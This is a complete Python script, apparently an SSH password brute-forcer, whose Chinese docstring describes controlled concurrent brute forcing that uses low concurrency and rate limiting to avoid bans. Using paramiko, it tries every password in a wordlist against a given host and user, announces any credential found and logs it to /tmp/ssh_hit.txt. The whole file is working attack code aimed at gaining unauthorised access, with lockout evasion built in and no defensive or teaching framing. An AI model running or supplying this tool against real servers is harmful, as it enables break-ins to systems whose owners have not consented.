#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SSH 并发受控爆破 (paramiko), 低并发+限速防封"""
import sys, time, threading, concurrent.futures, paramiko

def try_one(host, user, passwd):
    cl = paramiko.SSHClient()
    cl.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cl.connect(host, port=22, username=user, password=passwd, timeout=6,
                   banner_timeout=6, auth_timeout=6, look_for_keys=False, allow_agent=False)
        return (passwd, "SUCCESS")
    except paramiko.AuthenticationException:
        return (passwd, "FAIL")
    except Exception:
        return (passwd, "NET")
    finally:
        try: cl.close()
        except Exception: pass

def main():
    host, user, wordlist = sys.argv[1], sys.argv[2], sys.argv[3]
    with open(wordlist, encoding='utf-8', errors='replace') as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    print(f"[start] {user}@{host} testing {len(lines)} passwords, concurrency=4", flush=True)
    found = None
    total = len(lines)
    done = 0
    rate_lock = threading.Lock()
    stop = threading.Event()
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        futs = {ex.submit(try_one, host, user, p): p for p in lines}
        for fut in concurrent.futures.as_completed(futs):
            if stop.is_set():
                break
            p, r = fut.result()
            with rate_lock:
                done += 1
            if r == "SUCCESS":
                found = p
                print(f"\n[***] CREDENTIAL FOUND: {user} / {p}", flush=True)
                with open('/tmp/ssh_hit.txt', 'a') as o:
                    o.write(f"{host} {user} {p}\n")
                stop.set()
                break
            if done % 100 == 0:
                print(f"[progress] {done}/{total} ({p})", flush=True)
            if r == "NET":
                time.sleep(0.3)
    if found is None:
        print(f"[done] no hit for {user} on {host} ({done} tried)")

if __name__ == "__main__":
    main()
